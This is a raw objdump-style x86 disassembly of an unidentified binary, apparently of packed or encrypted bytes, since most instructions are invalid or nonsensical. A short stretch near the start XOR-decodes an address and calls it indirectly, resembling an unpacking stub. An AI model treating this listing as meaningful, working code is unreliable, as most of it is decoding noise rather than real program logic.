  40cb60:	shl    DWORD PTR gs:[ecx-0x1a879216],cl
  40cb67:	ret    
  40cb68:	fdivr  st,st(1)
  40cb6a:	call   0xcaaa:0x906471e3
  40cb71:	loope  0x40caf3
  40cb73:	mov    dl,0x29
  40cb75:	mov    esp,0xfbd5cdf0
  40cb7a:	jmp    0xd209:0xcc636ce5
  40cb81:	and    BYTE PTR [ecx],dl
  40cb83:	mov    DWORD PTR [ebx+0x39daa8e],esi
  40cb89:	mov    edi,0xd080d004
  40cb8e:	push   es
  40cb8f:	rol    DWORD PTR gs:[ebp+0x48],0x54
  40cb94:	push   ebx
  40cb95:	pop    DWORD PTR [ebx]
  40cb97:	(bad)  
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8+0x28]
  40cbfc:	mov    ds:0x8c62f398,eax
  40cc01:	jle    0x40cc81
  40cc03:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40cc07:	int    0xc9
  40cc09:	dec    esp
  40cc0a:	jno    0x40cc69
  40cc0c:	xchg   BYTE PTR [esi],ch
  40cc0e:	dec    esp
  40cc0f:	lods   eax,DWORD PTR ds:[esi]
  40cc10:	sbb    ch,bh
  40cc12:	push   0x36
  40cc14:	mov    dh,0x49
  40cc16:	(bad)  
  40cc17:	cmp    eax,DWORD PTR [ebx]
  40cc19:	lods   al,BYTE PTR ds:[esi]
  40cc1a:	fcmovbe st,st(4)
  40cc1c:	jbe    0x40cc32
  40cc1e:	cdq    
  40cc1f:	icebp  
  40cc20:	gs int3 
  40cc22:	aad    0x77
  40cc24:	in     al,0x5b
  40cc26:	dec    BYTE PTR [edi-0x19f3007c]
  40cc2c:	outs   dx,BYTE PTR ds:[esi]
  40cc2d:	arpl   cx,bx
  40cc2f:	pusha  
  40cc30:	aad    0x9d
  40cc32:	jns    0x40cca6
  40cc34:	in     al,0xa1
  40cc36:	test   BYTE PTR [edx-0x5fd628be],ah
  40cc3c:	in     al,0x33
  40cc3e:	call   0x33b1:0xd539e455
  40cc45:	push   ss
  40cc46:	aaa    
  40cc47:	fisttp WORD PTR [eax+0x42]
  40cc4a:	loop   0x40cc1c
  40cc4c:	mov    al,ds:0xaf08c24b
  40cc51:	push   esp
  40cc52:	lock (bad) 
  40cc54:	xchg   DWORD PTR [bx+0x616a],esi
  40cc59:	aas    
  40cc5a:	ficom  WORD PTR ds:0x2c64f395
  40cc60:	jg     0x40cc3c
  40cc62:	push   eax
  40cc63:	scas   al,BYTE PTR es:[edi]
  40cc64:	out    dx,eax
  40cc65:	dec    ebx
  40cc66:	xchg   ecx,eax
  40cc67:	arpl   WORD PTR [edx-0x7e586ae],cx
  40cc6d:	test   BYTE PTR [ebp+0x30],cl
  40cc70:	push   es
  40cc71:	fsub   st,st(2)
  40cc73:	dec    ebx
  40cc74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc75:	adc    DWORD PTR [esi],0x3b6344fc
  40cc7b:	jecxz  0x40cca6
  40cc7d:	inc    ecx
  40cc7e:	fsub   DWORD PTR [edx-0x53f43793]
  40cc84:	repnz inc ecx
  40cc86:	sbb    esi,DWORD PTR [ecx-0x61]
  40cc89:	dec    ebp
  40cc8a:	loopne 0x40cc75
  40cc8c:	mov    ?,WORD PTR [ebx-0x582806fd]
  40cc92:	int3   
  40cc93:	cmp    BYTE PTR ds:0xad6ef8f5,0x33
  40cc9a:	jnp    0x40cce6
  40cc9c:	pushf  
  40cc9d:	push   ss
  40cc9e:	jb     0x40ccc5
  40cca0:	ret    
  40cca1:	jl     0x40cc50
  40cca3:	rol    BYTE PTR [edx],0x72
  40cca6:	repz jmp 0x1baefa2a
  40ccac:	push   ds
  40ccad:	cmp    eax,0xa475119b
  40ccb2:	jb     0x40ccee
  40ccb4:	add    eax,0x5f1758a
  40ccb9:	jns    0x40cd22
  40ccbb:	scas   al,BYTE PTR es:[edi]
  40ccbc:	inc    ebp
  40ccbd:	mov    esi,0x41ae13a2
  40ccc2:	inc    ecx
  40ccc3:	mov    edx,0x8d92bc92
  40ccc8:	push   es
  40ccc9:	sub    BYTE PTR [esi],bl
  40cccb:	jno    0x40cc7c
  40cccd:	jmp    0x3b67:0x2c1b5389
  40ccd4:	xchg   edx,eax
  40ccd5:	push   eax
  40ccd6:	sub    bh,BYTE PTR [eax]
  40ccd8:	push   ecx
  40ccd9:	adc    edi,DWORD PTR [ebp+0x6b]
  40ccdc:	fcom   QWORD PTR [esi]
  40ccde:	pop    ss
  40ccdf:	pop    ss
  40cce0:	scas   eax,DWORD PTR es:[edi]
  40cce1:	icebp  
  40cce2:	cmp    esp,edi
  40cce4:	cli    
  40cce5:	call   0xdddd028e
  40ccea:	lahf   
  40cceb:	popa   
  40ccec:	push   eax
  40cced:	cmp    DWORD PTR [esi+0x1a704b7b],0xb5233342
  40ccf7:	adc    eax,0x4f353fed
  40ccfc:	sub    DWORD PTR [ecx+0x5014774d],0x7a
  40cd03:	(bad)  
  40cd04:	jl     0x40cd19
  40cd06:	mov    ch,0xb
  40cd08:	inc    ebx
  40cd09:	cmc    
  40cd0a:	jno    0x40cc8d
  40cd0c:	cld    
  40cd0d:	mov    ch,0x79
  40cd0f:	cdq    
  40cd10:	scas   al,BYTE PTR es:[edi]
  40cd11:	ds lock push ebp
  40cd14:	mov    bh,0x75
  40cd16:	test   BYTE PTR [ecx],ch
  40cd18:	shr    BYTE PTR [edx-0x3c],1
  40cd1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd1c:	jne    0x40cd78
  40cd1e:	jg     0x40cd86
  40cd20:	pusha  
  40cd21:	xlat   BYTE PTR ds:[ebx]
  40cd22:	(bad)  [eax]
  40cd24:	and    eax,0x6b4a968e
  40cd29:	retf   
  40cd2a:	ret    0x3660
  40cd2d:	lods   eax,DWORD PTR ds:[esi]
  40cd2e:	aam    0x5e
  40cd30:	jns    0x40cd21
  40cd32:	and    esi,eax
  40cd34:	dec    ebx
  40cd35:	iret   
  40cd36:	daa    
  40cd37:	xchg   ebp,eax
  40cd38:	dec    esi
  40cd39:	cmc    
  40cd3a:	mov    eax,ds:0x5569889f
  40cd3f:	popa   
  40cd40:	jl     0x40cd3a
  40cd42:	in     eax,dx
  40cd43:	popa   
  40cd44:	sti    
  40cd45:	mov    ecx,ss
  40cd47:	imul   ebp,DWORD PTR [ecx-0x3d6e9679],0xffffff91
  40cd4e:	cmp    DWORD PTR [eax+0x7b401916],esp
  40cd54:	inc    esi
  40cd55:	sub    ebx,DWORD PTR [eax-0x4d]
  40cd58:	push   esp
  40cd59:	inc    ecx
  40cd5a:	(bad)  
  40cd5b:	loope  0x40cd40
  40cd5d:	add    eax,0x2ae138d3
  40cd62:	jo     0x40cd43
  40cd64:	inc    esp
  40cd65:	jmp    0x40cd5f
  40cd67:	fsub   DWORD PTR [esi-0x56]
  40cd6a:	fdivr  st(6),st
  40cd6c:	(bad)  
  40cd6d:	icebp  
  40cd6e:	add    DWORD PTR [esi+eiz*4+0x59ff52c3],esi
  40cd75:	xchg   ebp,eax
  40cd76:	into   
  40cd77:	popf   
  40cd78:	sbb    al,0x88
  40cd7a:	bound  esp,QWORD PTR [ebx+0x4f947ffb]
  40cd80:	jmp    0x479f:0x3897edcc
  40cd87:	xor    al,0x6f
  40cd89:	xor    DWORD PTR [ebx+eax*1-0x5b],esp
  40cd8d:	push   es
  40cd8e:	cwde   
  40cd8f:	in     eax,0x2
  40cd91:	or     al,0xa9
  40cd93:	xor    BYTE PTR [esi+0x66],cl
  40cd96:	ror    bl,cl
  40cd98:	in     al,dx
  40cd99:	call   0xc1180186
  40cd9e:	jle    0x40cd25
  40cda0:	mov    bh,0xce
  40cda2:	push   0xffffff80
  40cda4:	jns    0x40cd3d
  40cda6:	mov    DWORD PTR [esi],esi
  40cda8:	dec    edi
  40cda9:	inc    ebp
  40cdaa:	mov    ecx,0xcd77ba07
  40cdaf:	mov    bh,0x3f
  40cdb1:	push   edi
  40cdb2:	xor    ch,BYTE PTR [ebp+0x20]
  40cdb5:	jae    0x40cd71
  40cdb7:	mov    al,BYTE PTR [edx-0x5d]
  40cdba:	sub    ch,dh
  40cdbc:	pop    es
  40cdbd:	xchg   esi,eax
  40cdbe:	mov    BYTE PTR [ebp+0x20773c94],dl
  40cdc4:	cld    
  40cdc5:	outs   dx,BYTE PTR ds:[esi]
  40cdc6:	add    BYTE PTR [esi+0x23],0xa6
  40cdca:	loop   0x40cd7c
  40cdcc:	mov    ebx,0x7711d333
  40cdd1:	inc    esi
  40cdd2:	xor    BYTE PTR [ecx-0x45],al
  40cdd5:	xchg   ebp,eax
  40cdd6:	pop    esi
  40cdd7:	or     eax,0x887adab5
  40cddc:	test   bh,bl
  40cdde:	add    DWORD PTR [ecx],eax
  40cde0:	add    ebp,DWORD PTR [edx-0x24]
  40cde3:	mov    BYTE PTR [ebx],bh
  40cde5:	out    0x2c,eax
  40cde7:	lods   eax,DWORD PTR ds:[esi]
  40cde8:	sub    al,0x9b
  40cdea:	pushf  
  40cdeb:	sbb    cl,BYTE PTR [ebx]
  40cded:	retf   
  40cdee:	fucomi st,st(1)
  40cdf0:	pop    ebx
  40cdf1:	clc    
  40cdf2:	test   DWORD PTR [ebp+0x1e65c7a4],esi
  40cdf8:	push   ebx
  40cdf9:	mov    eax,0x3cc67d86
  40cdfe:	mov    bh,0xe7
  40ce00:	push   ss
  40ce01:	cmp    ah,cl
  40ce03:	in     al,0xc8
  40ce05:	in     al,0x51
  40ce07:	retf   0x990f
  40ce0a:	enter  0x175f,0xf5
  40ce0e:	sbb    eax,0xbccd63c1
  40ce13:	imul   edi,ecx,0xfffffffd
  40ce16:	mov    edi,0xc3f9fb2b
  40ce1b:	clc    
  40ce1c:	xchg   edi,eax
  40ce1d:	out    dx,al
  40ce1e:	mov    al,0xf2
  40ce20:	mov    ebp,0x47336130
  40ce25:	pop    edx
  40ce26:	mov    dl,0x5e
  40ce28:	stos   DWORD PTR es:[edi],eax
  40ce29:	xchg   ebp,eax
  40ce2a:	retf   
  40ce2b:	adc    dl,BYTE PTR [ecx]
  40ce2d:	or     BYTE PTR [eax],dh
  40ce2f:	pop    edi
  40ce30:	dec    ebp
  40ce31:	sub    eax,ecx
  40ce33:	mov    ebx,0xadc67d57
  40ce38:	jnp    0x40ce28
  40ce3a:	ret    0x9cae
  40ce3d:	pop    ebx
  40ce3e:	dec    eax
  40ce3f:	xorps  xmm3,XMMWORD PTR [esi-0x6b]
  40ce43:	fisub  DWORD PTR [ecx-0x39]
  40ce46:	(bad)  
  40ce48:	aas    
  40ce49:	sub    esp,ebp
  40ce4b:	cmp    ebp,DWORD PTR [ebp+0x2b]
  40ce4e:	fld    DWORD PTR [edi+0x25ee9cb]
  40ce54:	add    BYTE PTR [eax],al
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	mov    edi,0x2c2a20b3
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	pop    es
  40ce6f:	out    0x53,al
  40ce71:	loop   0x40ce25
  40ce73:	or     al,0x58
  40ce75:	and    al,0x5
  40ce77:	imul   esi,DWORD PTR ds:0x9966e93f,0x22
  40ce7e:	outs   dx,BYTE PTR ds:[esi]
  40ce7f:	sar    DWORD PTR [ebx],1
  40ce81:	leave  
  40ce82:	jmp    0x40cedd
  40ce84:	mov    cl,0x8c
  40ce86:	call   0x6daf:0x1ef0e84a
  40ce8d:	addr16 retf 
  40ce8f:	or     bl,BYTE PTR es:[ecx+0xd]
  40ce93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce94:	pop    esp
  40ce95:	mov    al,0x77
  40ce97:	push   es
  40ce98:	and    dh,cl
  40ce9a:	stos   DWORD PTR es:[edi],eax
  40ce9b:	call   0xf73e:0x39e1cc9b
  40cea2:	iret   
  40cea3:	jb     0x40cf1d
  40cea5:	mov    ch,0xb4
  40cea7:	and    al,0x37
  40cea9:	inc    ebp
  40ceaa:	int3   
  40ceab:	addr16 pop es
  40cead:	pop    edx
  40ceae:	inc    edx
  40ceaf:	cli    
  40ceb0:	xchg   esi,eax
  40ceb1:	inc    ecx
  40ceb2:	jno    0x40cf15
  40ceb4:	cli    
  40ceb5:	xlat   BYTE PTR ds:[ebx]
  40ceb6:	loope  0x40ce74
  40ceb8:	ins    BYTE PTR es:[edi],dx
  40ceb9:	daa    
  40ceba:	xor    BYTE PTR [edi+0x7d],bh
  40cebd:	push   ds
  40cebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cebf:	mov    ds:0x96979d7d,al
  40cec4:	pop    ds
  40cec5:	jmp    0x40cede
  40cec7:	push   cs
  40cec8:	repz fwait
  40ceca:	jecxz  0x40ced6
  40cecc:	mov    esi,0x899ff278
  40ced1:	scas   eax,DWORD PTR es:[edi]
  40ced2:	and    al,0x96
  40ced4:	jbe    0x40ce84
  40ced6:	(bad)  
  40ced7:	push   cs
  40ced8:	mov    dl,BYTE PTR [eax]
  40ceda:	test   DWORD PTR [ecx+0x0],eax
  40cedd:	pop    ebp
  40cede:	xchg   ebp,eax
  40cedf:	lock stos DWORD PTR es:[edi],eax
  40cee1:	jno    0x40cea5
  40cee3:	cmp    DWORD PTR [edi+0x7f8209f2],esp
  40cee9:	std    
  40ceea:	clc    
  40ceeb:	mov    cs,WORD PTR [esi]
  40ceed:	cmp    BYTE PTR [edi],0xce
  40cef0:	sbb    bh,BYTE PTR [edx+edx*4+0x30]
  40cef4:	xchg   ecx,eax
  40cef5:	mov    dh,0x1a
  40cef7:	sub    DWORD PTR [eax+0x66b2709c],ebx
  40cefd:	pop    edi
  40cefe:	shr    DWORD PTR [ecx+esi*1-0x66a9d447],0x16
  40cf06:	xor    DWORD PTR [esi-0x5bb09fbc],eax
  40cf0c:	daa    
  40cf0d:	imul   ecx,edi,0x77
  40cf10:	cwde   
  40cf11:	lock mov esp,0xef3174b8
  40cf17:	das    
  40cf18:	xor    al,0xc
  40cf1a:	xor    cl,dl
  40cf1c:	adc    esp,edx
  40cf1e:	push   esp
  40cf1f:	mov    bl,0xb4
  40cf21:	popa   
  40cf22:	ss loop 0x40ceeb
  40cf25:	mov    ds:0xf814628b,al
  40cf2a:	(bad)  
  40cf2b:	int    0xe4
  40cf2d:	jb     0x40cef2
  40cf2f:	rcr    BYTE PTR [edi],1
  40cf31:	jo     0x40cfa2
  40cf33:	pop    ds
  40cf34:	mov    DWORD PTR [ecx+0x42],ecx
  40cf37:	into   
  40cf38:	pop    esp
  40cf39:	popa   
  40cf3a:	xor    DWORD PTR [ebp+0x70],ecx
  40cf3d:	in     al,0xd3
  40cf3f:	or     BYTE PTR [ebp+0x79c50477],0xb5
  40cf46:	dec    ecx
  40cf47:	mov    WORD PTR [esi],cs
  40cf49:	mov    al,ds:0x25f533c5
  40cf4e:	inc    esp
  40cf4f:	adc    BYTE PTR [ecx+0x10],cl
  40cf52:	lods   eax,DWORD PTR ds:[esi]
  40cf53:	or     BYTE PTR [eax-0x5a],al
  40cf56:	mov    eax,0x5a451b81
  40cf5b:	xchg   edx,eax
  40cf5c:	mov    ?,eax
  40cf5e:	mov    ebp,edx
  40cf60:	mov    edx,0xcb492ea5
  40cf65:	lods   al,BYTE PTR ds:[esi]
  40cf66:	add    DWORD PTR [edi-0x6407be1],ebx
  40cf6c:	jbe    0x40cf16
  40cf6e:	xchg   ch,ah
  40cf70:	xchg   edx,eax
  40cf71:	lds    edx,FWORD PTR [ebx-0x6c008371]
  40cf77:	cmp    eax,0x1284737a
  40cf7c:	cld    
  40cf7d:	repnz adc BYTE PTR ds:0xb13955d7,bl
  40cf84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf85:	mov    bh,bl
  40cf87:	out    dx,eax
  40cf88:	out    0x6e,al
  40cf8a:	pop    ds
  40cf8b:	pop    ebp
  40cf8c:	xlat   BYTE PTR ds:[ebx]
  40cf8d:	inc    esi
  40cf8e:	xor    al,0x38
  40cf90:	sbb    ch,dl
  40cf92:	fwait
  40cf93:	stc    
  40cf94:	dec    ebp
  40cf95:	xor    esp,DWORD PTR [ecx+0x63]
  40cf98:	push   0x52a65123
  40cf9d:	aaa    
  40cf9e:	sbb    BYTE PTR [ecx+ebx*1],bh
  40cfa1:	leave  
  40cfa2:	sub    ecx,DWORD PTR [edi+0x2619f700]
  40cfa8:	cdq    
  40cfa9:	mov    ds:0x630bc8cf,eax
  40cfae:	mov    edx,0x6cb439ca
  40cfb3:	pusha  
  40cfb4:	out    dx,al
  40cfb5:	dec    esi
  40cfb6:	pop    ebp
  40cfb7:	or     esp,edi
  40cfb9:	hlt    
  40cfba:	mov    ch,0x45
  40cfbc:	pop    es
  40cfbd:	dec    edx
  40cfbe:	int    0x3e
  40cfc0:	cmp    eax,0xb9d8a353
  40cfc5:	jb     0x40cfca
  40cfc7:	pop    ebp
  40cfc8:	push   eax
  40cfc9:	stc    
  40cfca:	je     0x40cf59
  40cfcc:	scas   eax,DWORD PTR es:[edi]
  40cfcd:	jo     0x40cf81
  40cfcf:	mov    dl,0xca
  40cfd1:	div    BYTE PTR [edx+0x20]
  40cfd4:	dec    ebx
  40cfd5:	out    0xb,al
  40cfd7:	push   edx
  40cfd8:	ja     0x40cf72
  40cfda:	test   al,0xf1
  40cfdc:	fnstsw WORD PTR [esi-0x6a3c7016]
  40cfe2:	jne    0x40cf7f
  40cfe4:	or     BYTE PTR ds:0x2fafe595,ch
  40cfea:	jbe    0x40cfed
  40cfec:	aaa    
  40cfed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfee:	adc    BYTE PTR [ebp-0x47],dh
  40cff1:	push   ebx
  40cff2:	jg     0x40cf98
  40cff4:	xcrypt-cfb (bad)
  40cff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cff6:	addr16 mov ecx,0x9db63b17
  40cffc:	lock mov eax,DWORD PTR [ecx-0x2d]
  40d000:	jmp    0xe22c:0x17be01d6
  40d007:	sbb    cl,BYTE PTR [ebx+esi*8-0x2]
  40d00b:	cmp    eax,esi
  40d00d:	push   esp
  40d00e:	xor    BYTE PTR [esi-0x63a4e659],dh
  40d014:	cmp    DWORD PTR [ecx+0x7e],0xffffff87
  40d018:	mov    ?,WORD PTR [ebp+ebx*8+0x54d725e1]
  40d01f:	jp     0x40cfad
  40d021:	not    bh
  40d023:	sub    al,0xa0
  40d025:	and    BYTE PTR [edi+esi*1-0x5d0735fd],dl
  40d02c:	out    dx,eax
  40d02d:	push   es
  40d02e:	aas    
  40d02f:	push   edi
  40d030:	fdiv   st,st(2)
  40d032:	mov    DWORD PTR [eax-0x751513bb],eax
  40d038:	lock push 0x79
  40d03b:	lods   eax,DWORD PTR ds:[esi]
  40d03c:	leave  
  40d03d:	fcomp  QWORD PTR [edi-0x54]
  40d040:	mov    ebp,0x719dd915
  40d045:	mov    eax,0xbb2e6664
  40d04a:	inc    ecx
  40d04b:	repnz stos DWORD PTR es:[edi],eax
  40d04d:	inc    ebp
  40d04e:	push   ebx
  40d04f:	fnstsw WORD PTR [ebp+eiz*2+0x1e3042ab]
  40d056:	stos   DWORD PTR es:[edi],eax
  40d057:	mov    esp,DWORD PTR [edx]
  40d059:	repnz xchg ah,bh
  40d05c:	lea    esp,[ebp-0x23]
  40d05f:	hlt    
  40d060:	out    0xd5,eax
  40d062:	xor    ebx,DWORD PTR [eax+0x36252c57]
  40d068:	sub    edi,edx
  40d06a:	(bad)  
  40d06b:	aaa    
  40d06c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d06d:	xor    al,0xda
  40d06f:	mov    esp,DWORD PTR [ebx]
  40d071:	sub    dh,al
  40d073:	(bad)  
  40d076:	jle    0x40d0d8
  40d078:	lahf   
  40d079:	das    
  40d07a:	or     bh,ch
  40d07c:	ja     0x40d069
  40d07e:	and    al,BYTE PTR [eax]
  40d080:	adc    eax,0xa7134b01
  40d085:	inc    eax
  40d086:	ins    DWORD PTR es:[edi],dx
  40d087:	xchg   esp,eax
  40d088:	mov    edx,0xf3c80642
  40d08d:	jmp    0xed3d:0xfd1fc076
  40d094:	mov    ds:0x3596b8b4,al
  40d099:	jnp    0x40d0ac
  40d09b:	loopne 0x40d093
  40d09d:	idiv   ch
  40d09f:	daa    
  40d0a0:	test   esi,ebx
  40d0a2:	arpl   WORD PTR [edx],sp
  40d0a4:	push   es
  40d0a5:	mov    BYTE PTR ds:0x752517b7,ah
  40d0ab:	inc    esi
  40d0ac:	rdtsc  
  40d0ae:	add    eax,0x50eaebf4
  40d0b3:	popf   
  40d0b4:	dec    ecx
  40d0b5:	mov    eax,DWORD PTR [ebp-0x1c]
  40d0b8:	imul   eax,ecx
  40d0bb:	add    esp,eax
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	jmp    0x40d0b6
  40d0d1:	push   edx
  40d0d2:	pop    edx
  40d0d3:	test   BYTE PTR [ecx+0x7c387e7e],0x7e
  40d0da:	jle    0x40d0c7
  40d0dc:	mul    ah
  40d0de:	push   0x2e07066
  40d0e3:	retf   
  40d0e4:	ins    BYTE PTR es:[edi],dx
  40d0e5:	arpl   bx,di
  40d0e7:	mov    ah,0x38
  40d0e9:	or     edi,DWORD PTR ds:0xc0a1684f
  40d0ef:	imul   ebx,DWORD PTR [esi],0xb739cc41
  40d0f5:	lea    ecx,[esi+esi*2-0x47]
  40d0f9:	dec    edi
  40d0fa:	cmp    eax,0x2724014b
  40d0ff:	xchg   esi,eax
  40d100:	inc    edi
  40d101:	mov    ah,0x62
  40d103:	cmp    ecx,esp
  40d105:	loope  0x40d0c7
  40d107:	(bad)  [edi]
  40d109:	ins    BYTE PTR es:[edi],dx
  40d10a:	xchg   edi,eax
  40d10b:	int3   
  40d10c:	push   edi
  40d10d:	(bad)  
  40d10e:	test   eax,0xf1bb29d8
  40d113:	push   edx
  40d114:	cmp    eax,0x4ae1282c
  40d119:	std    
  40d11a:	mov    dl,0x42
  40d11c:	mov    ch,0xe4
  40d11e:	jecxz  0x40d0f4
  40d120:	cmp    eax,DWORD PTR [edx+edi*4+0x1e869663]
  40d127:	push   es
  40d128:	sub    ebx,DWORD PTR [edx-0x66]
  40d12b:	sub    BYTE PTR [esi],bh
  40d12d:	int    0xea
  40d12f:	and    esp,DWORD PTR [edi+edx*8+0xd4c455e]
  40d136:	jge    0x40d184
  40d138:	jecxz  0x40d199
  40d13a:	pop    ecx
  40d13b:	je     0x40d154
  40d13d:	dec    esp
  40d13e:	pop    ecx
  40d13f:	(bad)  
  40d141:	mov    ecx,0x80d1ae25
  40d146:	pop    edx
  40d147:	push   edi
  40d148:	aad    0x81
  40d14a:	lods   al,BYTE PTR ds:[esi]
  40d14b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d14c:	xor    eax,0x9254aac2
  40d151:	(bad)  
  40d152:	mov    DWORD PTR [eax+0x19],eax
  40d155:	mov    ecx,0x3e8c8678
  40d15a:	mov    ah,0xaf
  40d15c:	leave  
  40d15d:	ret    0x1497
  40d160:	or     DWORD PTR [ecx+eiz*8],edi
  40d163:	imul   ebp,DWORD PTR [eax],0x9d31c8c2
  40d169:	or     bh,bh
  40d16b:	ins    BYTE PTR es:[edi],dx
  40d16c:	add    ch,BYTE PTR [edi+0x3b5124ef]
  40d172:	dec    eax
  40d173:	out    dx,eax
  40d174:	mov    cl,0xa8
  40d176:	xchg   esi,eax
  40d177:	jmp    0x40d186
  40d179:	test   al,0x1d
  40d17b:	lahf   
  40d17c:	add    dh,BYTE PTR [esp+ebx*4]
  40d17f:	(bad)  
  40d180:	retf   0x2d39
  40d183:	xor    eax,0xf1ee1d7e
  40d188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d189:	push   ebp
  40d18a:	dec    edi
  40d18b:	aaa    
  40d18c:	in     al,dx
  40d18d:	fs popa 
  40d18f:	adc    BYTE PTR [eax],cl
  40d191:	jl     0x6538aa0b
  40d197:	xor    DWORD PTR [esi+0x6ddb4e34],0x3a
  40d19e:	dec    edx
  40d19f:	ss iret 
  40d1a1:	jne    0x40d201
  40d1a3:	mov    bl,0x5
  40d1a5:	xlat   BYTE PTR ds:[ebx]
  40d1a6:	jmp    0x4754c9bc
  40d1ab:	xor    BYTE PTR [esp+ebp*2],dh
  40d1ae:	and    edx,DWORD PTR ds:0xf64f4909
  40d1b4:	push   cs
  40d1b5:	mov    WORD PTR [edx+0x42],ds
  40d1b8:	dec    edi
  40d1b9:	loope  0x40d1a2
  40d1bb:	mov    cl,BYTE PTR [ecx]
  40d1bd:	data16 lock and al,0x21
  40d1c1:	and    BYTE PTR [edx-0x40],0x65
  40d1c5:	imul   eax,DWORD PTR [edx],0xcdd9e50c
  40d1cb:	sbb    ebx,DWORD PTR [ebx-0x6154ac83]
  40d1d1:	and    BYTE PTR [ebp-0x1a9b1ccd],dl
  40d1d7:	test   al,0xfa
  40d1d9:	cmp    eax,0x19e845e8
  40d1de:	adc    bh,0x10
  40d1e1:	out    dx,eax
  40d1e2:	loopne 0x40d16a
  40d1e4:	jl     0x40d220
  40d1e6:	clc    
  40d1e7:	xlat   BYTE PTR ds:[ebx]
  40d1e8:	xchg   edx,eax
  40d1e9:	sar    DWORD PTR [edi+0x1ba67f52],cl
  40d1ef:	call   0x34d98669
  40d1f4:	sahf   
  40d1f5:	add    dh,bl
  40d1f7:	xchg   BYTE PTR [eax+0x1fbd20f6],bl
  40d1fd:	sub    al,0x6f
  40d1ff:	stos   BYTE PTR es:[edi],al
  40d200:	sahf   
  40d201:	jno    0x40d1c8
  40d203:	push   esi
  40d204:	lods   eax,DWORD PTR ds:[esi]
  40d205:	jae    0x40d1b1
  40d207:	jns    0x40d198
  40d209:	xor    ch,BYTE PTR [edx-0xf]
  40d20c:	cli    
  40d20d:	fnstsw WORD PTR [edi+edi*1]
  40d210:	and    ah,BYTE PTR [ebx+0x39]
  40d213:	pushf  
  40d214:	jl     0x40d255
  40d216:	fsubr  DWORD PTR [ebx-0x717ee1f6]
  40d21c:	xchg   edx,eax
  40d21d:	push   eax
  40d21e:	in     eax,dx
  40d21f:	sub    ch,BYTE PTR [esi-0x75d2077c]
  40d225:	lds    edx,FWORD PTR [ecx]
  40d227:	sbb    cl,BYTE PTR [eax+0x44]
  40d22a:	pop    ebp
  40d22b:	dec    ecx
  40d22c:	jno    0x40d23c
  40d22e:	sbb    ebp,ecx
  40d230:	xchg   esp,eax
  40d231:	mov    edx,0x48d59b4a
  40d236:	add    al,BYTE PTR [ebp-0x7864e02b]
  40d23c:	sbb    eax,esi
  40d23e:	mov    edx,0x629ba7c3
  40d243:	loope  0x40d292
  40d245:	nop
  40d246:	cmp    al,BYTE PTR [ebx+0x5d74fd19]
  40d24c:	xor    ah,ch
  40d24e:	mov    ebp,0x176823f4
  40d253:	mov    ecx,DWORD PTR [ebx+0x79]
  40d256:	mov    dl,0x14
  40d258:	out    0xff,al
  40d25a:	jnp    0x40d24b
  40d25c:	push   es
  40d25d:	into   
  40d25e:	(bad)  
  40d25f:	or     DWORD PTR [edi+edx*4-0x50],edi
  40d263:	mov    ds:0x6a24e462,eax
  40d268:	mov    eax,DWORD PTR [edi]
  40d26a:	cmovs  ebx,edx
  40d26d:	push   ebx
  40d26e:	std    
  40d26f:	mov    cl,0x7e
  40d271:	sbb    al,0xb8
  40d273:	mov    ecx,0x170b2fd3
  40d278:	sar    esp,cl
  40d27a:	jmp    0x62ed12b
  40d27f:	fdiv   QWORD PTR [edx]
  40d281:	xchg   esp,eax
  40d282:	mov    ah,0x97
  40d284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d285:	outs   dx,DWORD PTR ds:[esi]
  40d286:	cmp    DWORD PTR [ecx+0x15],0x632a9963
  40d28d:	lock add ch,BYTE PTR [eax-0x76]
  40d291:	xchg   esp,eax
  40d292:	and    BYTE PTR [ecx+0x799d3fe7],bh
  40d298:	or     al,0x3f
  40d29a:	faddp  st(6),st
